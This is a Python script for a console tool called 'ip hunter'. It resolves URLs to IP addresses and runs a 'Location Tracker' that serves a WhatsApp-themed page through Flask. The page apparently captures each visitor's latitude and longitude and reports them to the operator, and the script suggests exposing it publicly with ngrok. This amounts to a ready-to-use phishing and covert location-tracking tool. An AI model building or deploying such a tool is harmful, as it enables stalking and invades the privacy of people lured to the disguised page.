import socket
import os
import json
import sys
import logging

R = '\033[31m'  # red
G = '\033[32m'  # green
C = '\033[36m'  # cyan
W = '\033[0m'   # white
Y = '\033[33m'  # yellow

art = r'''
      _               _                       _                      
     (_)             | |                     | |                
      _   _ __       | |__    _   _   _ __   | |_    ___   _ __ 
     | | | '_ \      | '_ \  | | | | | '_ \  | __|  / _ \ | '__|
     | | | |_) |     | | | | | |_| | | | | | | |_  |  __/ | |   
     |_| | .__/      |_| |_|  \__,_| |_| |_|  \__|  \___| |_|   
         | |                                                    
         |_|                                                    '''


def iptracker():

    try:
        url = input(f'{G}Enter url> {W}')
        print(f"Ip4 address of this url is {socket.gethostbyname(url)}")

    except Exception:
        print(f"{R} There was an error, either with the url or with your internet connection{W}")

def locationtracker():
    os.system("cls||clear")
    print(f"{G}{art}{W}\n\n")

    print(f"{Y}[!] Select a template:\n\n{W}")
    print(f"{G}[1]{W}", end=" ")
    print(f"{C}Whatsapp{W}")


    while True:
        entry = input(f"{G}[>] {W}")

        if entry == '1':
            try:

                from flask import Flask, render_template, request

                app = Flask(__name__)

                cli = sys.modules['flask.cli']
                cli.show_server_banner = lambda *x: None

                log = logging.getLogger('werkzeug').disabled = True
                print(f"{G}Serving on 127.0.0.1 at port 5000         —> [http://127.0.0.1:5000]")
                print(f"You can make web interface by using ngrok tool and using command      —> ngrok http 127.0.0.1:5000{W}")

                @app.route('/')
                def whatsapp():

                    return render_template("index.html")

                @app.route('/processUserInfo/<string:info>', methods=['POST'])
                def processUserInfo(info):

                    from rich.console import Console
                    from rich.table import Table

                    if request.method == 'POST':
                        inf = json.loads(info)
                        # json.dumps(info)

                        print()
                        print(f"{G}User Info recieved{W}")

                        console = Console()
                        print(f"{C}")
                        print()
                        table = Table(show_header=True, header_style="bold magenta")
                        table.add_column("Category", style="bright", width=12)
                        table.add_column("Data", style="bright", width=12)

                        table.add_row("[cyan]Latitude[/cyan]", f"[green]{inf['lat']}[/green]")
                        table.add_row("[cyan]Longitude[/cyan]", f"[green]{inf['lon']}[/green]")


                        console.print(table)
                        print(f"{W}")

                        return "Info Received Successful"

                    else:
                        return "Failed"
            except Exception:
                print(f"{R}Sorry there was an error{W}")



            try:
                app.run(host="127.0.0.1")

            except Exception as e:
                print(e)

def main():

    try:
        os.system("cls||clear")

        # Checking modules if they are present
        from flask import Flask, render_template, request
        from rich.console import Console
        from rich.table import Table

        print(f"{G}{art}{W}\n\n")

        print(f"{C} Version   —> 0.0{W}\n")

        print(f"{Y}[!] Select a command:\n\n")

        print(f"{G}[1]{W}", end=" ")
        print(f"{C}Track ip with url{W}")
        print(f"{G}[2]{W}", end=" ")
        print(f"{C}Location Tracker{W}")

        while True:
            entry = input(f"{G}[>] {W}")

            if entry == '1':
                iptracker()

            elif entry == '2':
                locationtracker()

            elif entry == 'exit':
                print("Bye")
                break

            else:
                print(f"{R}Invalid Input please try again!{W}")

    except ModuleNotFoundError:
        print(f"{G}Installing Modules{W}")
        os.system("pip install flask")
        os.system("pip install rich")
        os.system("cls||clear")
        main()

main()

